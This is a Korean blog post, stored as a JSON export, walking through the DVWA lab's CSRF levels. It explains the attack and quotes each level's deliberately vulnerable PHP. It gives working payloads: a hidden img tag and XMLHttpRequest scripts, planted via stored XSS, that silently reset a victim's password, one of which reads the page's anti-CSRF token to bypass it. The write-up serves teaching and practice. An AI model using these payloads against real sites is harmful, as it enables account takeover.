@@ -1,0 +1,629 @@
+{
+  "format": "yt010108-published-post",
+  "version": 1,
+  "id": "dc96d36d-f017-54d3-bc3a-b3c769d5ee47",
+  "kind": "posts",
+  "title": "[DVWA] CSRF",
+  "slug": "tistory-19",
+  "description": "1. CSRFCSRF는 클라이언트 신뢰성을 익스플로잇하는 취약점으로 웹 브라우저의 쿠키 시스템과 서버 인증 방식의 문제이다. DVWA에서 CSRF에 대해 알아보자. 1.1 CSRF 개념CSRF(사이트 간 요청 위조)는 사용자가 자신의 의지와는 무관하게 공격자가 의도한 행위(수정, 삭제, 등록 등)를 특정 웹사이트에 요청하게 만드는 공격이다. 내 브라우저가 나 몰래 내 권한으로 서버에 명령을 내리는 것이다. 일반적으로 공격자가 보낸 악성 링크를 클릭하거나, XSS(교차 사이트 스크립팅) 취약점과 연계하여 공격 코드가 심어진 게시글을 열람할 때 발생힌다. CSRF가 가능한 이유는 웹 브라우저의 쿠키 정책 때문이다. 브라우저는 특정 도메인으로 요청을 보낼 때, 그 도메인과 관련된 쿠키(세션 ID 포함)를 자동..",
+  "category": "Wargame / DVWA",
+  "date": "2026-01-03",
+  "tags": [],
+  "status": "published",
+  "trashedAt": null,
+  "publishedAt": "2026-01-03T19:38:42+09:00",
+  "updatedAt": "2026-01-20T13:27:46+09:00",
+  "sourceDigest": "d54f1142aff2e20b4ed104dcde7f50483b4e90c08cee09871f7e8b1de7b063f7",
+  "assets": [
+    {
+      "id": "e653466d-26e7-56fc-bcff-b3d8cc7e3a30",
+      "name": "tistory-19-e653466d-26e7-56fc-bcff-b3d8cc7e3a30.png",
+      "type": "image/png",
+      "path": "/assets/uploads/dc96d36d-f017-54d3-bc3a-b3c769d5ee47/e653466d-26e7-56fc-bcff-b3d8cc7e3a30.png",
+      "sha": "a9f04382883eb644f3a5b4b4baf0e7f9efa0f51a"
+    },
+    {
+      "id": "6a945b8e-06b8-50c6-a1c2-39fac8a3826f",
+      "name": "tistory-19-6a945b8e-06b8-50c6-a1c2-39fac8a3826f.png",
+      "type": "image/png",
+      "path": "/assets/uploads/dc96d36d-f017-54d3-bc3a-b3c769d5ee47/6a945b8e-06b8-50c6-a1c2-39fac8a3826f.png",
+      "sha": "8e4a55ccd02144031ba3cc1a88405ceb24856c74"
+    },
+    {
+      "id": "612fdca5-8886-5c9a-b3f4-2725350cefd7",
+      "name": "tistory-19-612fdca5-8886-5c9a-b3f4-2725350cefd7.png",
+      "type": "image/png",
+      "path": "/assets/uploads/dc96d36d-f017-54d3-bc3a-b3c769d5ee47/612fdca5-8886-5c9a-b3f4-2725350cefd7.png",
+      "sha": "aa362837f1cf7aeb353cc06cfd44db79c54220e0"
+    },
+    {
+      "id": "11a7a525-eb69-5e3f-8161-9c369205e5e3",
+      "name": "tistory-19-11a7a525-eb69-5e3f-8161-9c369205e5e3.png",
+      "type": "image/png",
+      "path": "/assets/uploads/dc96d36d-f017-54d3-bc3a-b3c769d5ee47/11a7a525-eb69-5e3f-8161-9c369205e5e3.png",
+      "sha": "2926519938da6b992f62556e12a73a104e81c0eb"
+    }
+  ],
+  "doc": {
+    "type": "doc",
+    "content": [
+      {
+        "type": "image",
+        "attrs": {
+          "assetId": "e653466d-26e7-56fc-bcff-b3d8cc7e3a30",
+          "src": "/assets/uploads/dc96d36d-f017-54d3-bc3a-b3c769d5ee47/e653466d-26e7-56fc-bcff-b3d8cc7e3a30.png",
+          "alt": "",
+          "title": null
+        }
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "1. CSRF"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "CSRF는 클라이언트 신뢰성을 익스플로잇하는 취약점으로 웹 브라우저의 쿠키 시스템과 서버 인증 방식의 문제이다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "DVWA에서 CSRF에 대해 알아보자."
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "horizontalRule"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "1.1 CSRF 개념"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "CSRF(사이트 간 요청 위조)는 사용자가 자신의 의지와는 무관하게 공격자가 의도한 행위(수정, 삭제, 등록 등)를 특정 웹사이트에 요청하게 만드는 공격이다. 내 브라우저가 나 몰래 내 권한으로 서버에 명령을 내리는 것이다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "일반적으로 공격자가 보낸 악성 링크를 클릭하거나, XSS(교차 사이트 스크립팅) 취약점과 연계하여 공격 코드가 심어진 게시글을 열람할 때 발생힌다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "CSRF가 가능한 이유는 웹 브라우저의 쿠키 정책 때문이다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "브라우저는 특정 도메인으로 요청을 보낼 때, 그 도메인과 관련된 쿠키(세션 ID 포함)를 자동으로 헤더에 포함시켜 전송한다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "horizontalRule"
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "2. 문제"
+          }
+        ]
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "assetId": "6a945b8e-06b8-50c6-a1c2-39fac8a3826f",
+          "src": "/assets/uploads/dc96d36d-f017-54d3-bc3a-b3c769d5ee47/6a945b8e-06b8-50c6-a1c2-39fac8a3826f.png",
+          "alt": "",
+          "title": null
+        }
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "DVWA 웹 사이트에서 password를 변경하는 기능을 구현해 뒀다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "csrf 실습을 해보자"
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "horizontalRule"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": " low level 코드"
+          }
+        ]
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "assetId": "6a945b8e-06b8-50c6-a1c2-39fac8a3826f",
+          "src": "/assets/uploads/dc96d36d-f017-54d3-bc3a-b3c769d5ee47/6a945b8e-06b8-50c6-a1c2-39fac8a3826f.png",
+          "alt": "",
+          "title": null
+        }
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "로우 레벨에서는 위 사진과 같은 기능이 나오고 123으로 password를 입력하면 get요청으로 password를 변경한다."
+          }
+        ]
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "assetId": "612fdca5-8886-5c9a-b3f4-2725350cefd7",
+          "src": "/assets/uploads/dc96d36d-f017-54d3-bc3a-b3c769d5ee47/612fdca5-8886-5c9a-b3f4-2725350cefd7.png",
+          "alt": "",
+          "title": null
+        }
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "DVWA 내의 Stored XSS 취약점(게시판)을 이용해 사용자가 글을 읽는 순간 공격이 실행되도록 구성해보자."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "dvwa에서 stored xss에서 get요청을 보내는 코드는 다음과 같다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "bash"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "<img src=\"http://[DVWA_IP]/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change\"\n     style=\"display:none;\" />"
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "만약 사용자가 게시판에 들어가 스크립트가 실행되면 get요청을 보내서 사용자의 비밀번호가 hacked로 변경되게 된다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "아래는 low레벨 코드로 password_new와 password_conf가 일치하는지만 확인할 뿐, 이 요청이 사용자가 의도하여 전송한 것인지 검증하는 로직이 전혀 없어 취약하다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "bash"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "<?php\n\nif( isset( $_GET[ 'Change' ] ) ) {\n    // Get input\n    $pass_new  = $_GET[ 'password_new' ];\n    $pass_conf = $_GET[ 'password_conf' ];\n\n    // Do the passwords match?\n    if( $pass_new == $pass_conf ) {\n        // They do!\n        $pass_new = ((isset($GLOBALS[\"___mysqli_ston\"]) && is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"],  $pass_new ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\"));\n        $pass_new = md5( $pass_new );\n\n        // Update the database\n        $insert = \"UPDATE `users` SET password = '$pass_new' WHERE user = '\" . dvwaCurrentUser() . \"';\";\n        $result = mysqli_query($GLOBALS[\"___mysqli_ston\"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );\n\n        // Feedback for the user\n        echo \"<pre>Password Changed.</pre>\";\n    }\n    else {\n        // Issue with passwords matching\n        echo \"<pre>Passwords did not match.</pre>\";\n    }\n\n    ((is_null($___mysqli_res = mysqli_close($GLOBALS[\"___mysqli_ston\"]))) ? false : $___mysqli_res);\n}\n\n?>"
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "horizontalRule"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": " medium level 코드"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "Low 레벨과 달리 HTTP_REFERER 검증 로직이 추가되었으나, 불완전한 검증 방식으로 인해 우회가 가능하다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "stripos(A, B): 문자열 A 안에 문자열 B가 포함되어 있는지 확인하는 함수다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "$_SERVER['HTTP_REFERER']: 요청을 보낸 이전 페이지의 URL(출처)을 담고 있다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "$_SERVER['SERVER_NAME']: 현재 DVWA가 구동 중인 서버의 도메인 이름이나 IP 주소다"
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "xss가 취약한 게시판에 아래와 같은 코드를 삽입하면 정상적으로 csrf가 실행되 비밀번호가 hacked로 바뀐다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "bash"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "<script>\n    \n    var req = new XMLHttpRequest();\n    req.open('GET', 'http://127.0.0.1/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change', true);\n    req.send();\n</script>"
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "bash"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "<?php\n\nif( isset( $_GET[ 'Change' ] ) ) {\n    // Checks to see where the request came from\n    if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ])!=-1 ) {\n        // Get input\n        $pass_new  = $_GET[ 'password_new' ];\n        $pass_conf = $_GET[ 'password_conf' ];\n\n        // Do the passwords match?\n        if( $pass_new == $pass_conf ) {\n            // They do!\n            $pass_new = ((isset($GLOBALS[\"___mysqli_ston\"]) && is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"],  $pass_new ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\"));\n            $pass_new = md5( $pass_new );\n\n            // Update the database\n            $insert = \"UPDATE `users` SET password = '$pass_new' WHERE user = '\" . dvwaCurrentUser() . \"';\";\n            $result = mysqli_query($GLOBALS[\"___mysqli_ston\"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );\n\n            // Feedback for the user\n            echo \"<pre>Password Changed.</pre>\";\n        }\n        else {\n            // Issue with passwords matching\n            echo \"<pre>Passwords did not match.</pre>\";\n        }\n    }\n    else {\n        // Didn't come from a trusted source\n        echo \"<pre>That request didn't look correct.</pre>\";\n    }\n\n    ((is_null($___mysqli_res = mysqli_close($GLOBALS[\"___mysqli_ston\"]))) ? false : $___mysqli_res);\n}\n\n?>"
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "horizontalRule"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "High level 코드"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "high레벨 코드는 checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );를 통해 user_token과 session_token 토큰을 검사한다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "토큰 없이 요청을 보내거나 틀린 토큰을 보내면 서버는 요청을 거부한다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "DVWA 내에 XSS 취약점이 있다면, 자바스크립트(document.getElementsByName...)를 통해 현재 페이지의 토큰을 읽어와 요청에 포함시키는 방식으로 우회가 가능하다.따라서 단순히 요청만 보내는 것이 아니라, 자바스크립트로 현재 페이지의 토큰 값을 읽어와서 요청에 포함시킨다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "bash"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "var token = document.getElementsByName('user_token')[0].value;\n\n\nvar req = new XMLHttpRequest();\nreq.open('GET', 'http://127.0.0.1/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change&user_token=' + token, true);\nreq.send();"
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "bash"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "<?php\n\nif( isset( $_GET[ 'Change' ] ) ) {\n    // Check Anti-CSRF token\n    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );\n\n    // Get input\n    $pass_new  = $_GET[ 'password_new' ];\n    $pass_conf = $_GET[ 'password_conf' ];\n\n    // Do the passwords match?\n    if( $pass_new == $pass_conf ) {\n        // They do!\n        $pass_new = ((isset($GLOBALS[\"___mysqli_ston\"]) && is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"],  $pass_new ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\"));\n        $pass_new = md5( $pass_new );\n\n        // Update the database\n        $insert = \"UPDATE `users` SET password = '$pass_new' WHERE user = '\" . dvwaCurrentUser() . \"';\";\n        $result = mysqli_query($GLOBALS[\"___mysqli_ston\"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );\n\n        // Feedback for the user\n        echo \"<pre>Password Changed.</pre>\";\n    }\n    else {\n        // Issue with passwords matching\n        echo \"<pre>Passwords did not match.</pre>\";\n    }\n\n    ((is_null($___mysqli_res = mysqli_close($GLOBALS[\"___mysqli_ston\"]))) ? false : $___mysqli_res);\n}\n\n// Generate Anti-CSRF token\ngenerateSessionToken();\n\n?>"
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "assetId": "11a7a525-eb69-5e3f-8161-9c369205e5e3",
+          "src": "/assets/uploads/dc96d36d-f017-54d3-bc3a-b3c769d5ee47/11a7a525-eb69-5e3f-8161-9c369205e5e3.png",
+          "alt": "",
+          "title": null
+        }
+      },
+      {
+        "type": "horizontalRule"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "Impossible level 코드"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "Impossible leve코드는 사용자가 비밀번호를 변경하려면 반드시 현재 사용 중인 비밀번호를 입력해야 한다. 서버는 DB에서 조회한 비밀번호와 사용자가 입력한 password_current가 일치할 때만 변경 요청을 승인한다"
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "bash"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "<?php\n\nif( isset( $_GET[ 'Change' ] ) ) {\n    // Check Anti-CSRF token\n    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );\n\n    // Get input\n    $pass_curr = $_GET[ 'password_current' ];\n    $pass_new  = $_GET[ 'password_new' ];\n    $pass_conf = $_GET[ 'password_conf' ];\n\n    // Sanitise current password input\n    $pass_curr = stripslashes( $pass_curr );\n    $pass_curr = ((isset($GLOBALS[\"___mysqli_ston\"]) && is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"],  $pass_curr ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\"));\n    $pass_curr = md5( $pass_curr );\n\n    // Check that the current password is correct\n    $data = $db->prepare( 'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' );\n    $data->bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );\n    $data->bindParam( ':password', $pass_curr, PDO::PARAM_STR );\n    $data->execute();\n\n    // Do both new passwords match and does the current password match the user?\n    if( ( $pass_new == $pass_conf ) && ( $data->rowCount() == 1 ) ) {\n        // It does!\n        $pass_new = stripslashes( $pass_new );\n        $pass_new = ((isset($GLOBALS[\"___mysqli_ston\"]) && is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"],  $pass_new ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\"));\n        $pass_new = md5( $pass_new );\n\n        // Update database with new password\n        $data = $db->prepare( 'UPDATE users SET password = (:password) WHERE user = (:user);' );\n        $data->bindParam( ':password', $pass_new, PDO::PARAM_STR );\n        $data->bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );\n        $data->execute();\n\n        // Feedback for the user\n        echo \"<pre>Password Changed.</pre>\";\n    }\n    else {\n        // Issue with passwords matching\n        echo \"<pre>Passwords did not match or current password incorrect.</pre>\";\n    }\n}\n\n// Generate Anti-CSRF token\ngenerateSessionToken();\n\n?>"
+          }
+        ]
+      },
+      {
+        "type": "horizontalRule"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "3. 3줄 요약"
+          }
+        ]
+      },
+      {
+        "type": "bulletList",
+        "content": [
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "CSRF는 사용자가 인지하지 못한 상태에서 공격자가 의도한 악성 요청을 인증된 세션으로 서버에 전송하게 만드는 공격이다."
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "웹 브라우저가 도메인에 대한 HTTP 요청 시 쿠키 등 인증 정보를 자동으로 포함하는 구조적 취약점을 악용한다."
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "xss랑 연계되기 쉽다"
+                  }
+                ]
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": " "
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "horizontalRule"
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "참고 자료:"
+          }
+        ]
+      }
+    ]
+  },
+  "source": {
+    "platform": "tistory",
+    "url": "https://yt5246.tistory.com/19",
+    "originalId": "19",
+    "publishedAt": "2026-01-03T19:38:42+09:00",
+    "updatedAt": "2026-01-20T13:27:46+09:00",
+    "importedAt": "2026-10-25T14:17:38+09:00"
+  }
+}
